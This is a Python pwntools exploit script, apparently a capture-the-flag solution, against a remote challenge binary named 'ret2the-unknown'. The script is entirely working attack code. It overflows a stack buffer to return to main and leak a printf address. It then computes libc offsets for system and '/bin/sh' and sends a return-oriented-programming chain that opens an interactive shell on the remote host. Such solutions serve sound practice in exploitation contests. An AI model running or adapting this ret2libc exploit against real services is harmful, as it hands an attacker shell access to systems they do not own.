#!/usr/bin/env python3
from pwn.toplevel import p64, ELF, remote, process, ROP, gdb
bin = ELF("./ret2the-unknown")
rop = ROP("./ret2the-unknown")
#s = gdb.debug("./ret2the-unknown", env={"LD_PRELOAD": "./libc-2.28.so"})
s = remote("mc.ax", 31568)

main_addr = bin.symbols["main"]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]  #type:ignore
ret = rop.find_gadget(["ret"])[0]  #type:ignore
s.recvuntil("safely?\n")
s.sendline(b"A" * 40 + p64(main_addr))
s.recvuntil("there: ")

printf_addr = int(s.recvline().strip(), 16)
system_addr = printf_addr - 0x13ba0
binsh_addr = printf_addr + 0x128fb9
print(hex(printf_addr), hex(system_addr), hex(binsh_addr))
s.recvuntil("safely?\n")
s.sendline(b"A" * 40 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr))
s.interactive()
